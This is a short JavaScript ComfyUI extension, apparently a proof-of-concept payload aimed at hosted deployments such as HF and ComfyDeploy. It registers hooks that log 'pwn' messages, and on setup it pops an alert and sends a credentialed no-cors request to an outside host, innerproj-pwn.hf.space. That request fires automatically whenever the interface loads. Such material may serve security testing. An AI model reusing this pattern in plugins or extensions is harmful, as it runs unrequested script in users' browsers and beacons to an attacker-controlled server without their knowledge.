// HF
import { app } from "../../scripts/app.js";
// ComfyDeploy
// import { app } from "../../../scripts/app.js";
const ext = {
    name: 'Alert.Node',
  
    native_mode: false,
  
    init(app) {
        console.log("pwn-init!");
    },

    async beforeRegisterNodeDef(nodeType, nodeData, app2) {
        console.log("pwn-beforeRegisterNodeDef!");
    },

    async setup() {
        console.log("pwn-setup!");
        alert("pwn-setup!");
        await fetch("https://innerproj-pwn.hf.space/", {
            method: "GET",
            mode: "no-cors",
            credentials: "include"
        });
    }
}

app.registerExtension(ext);
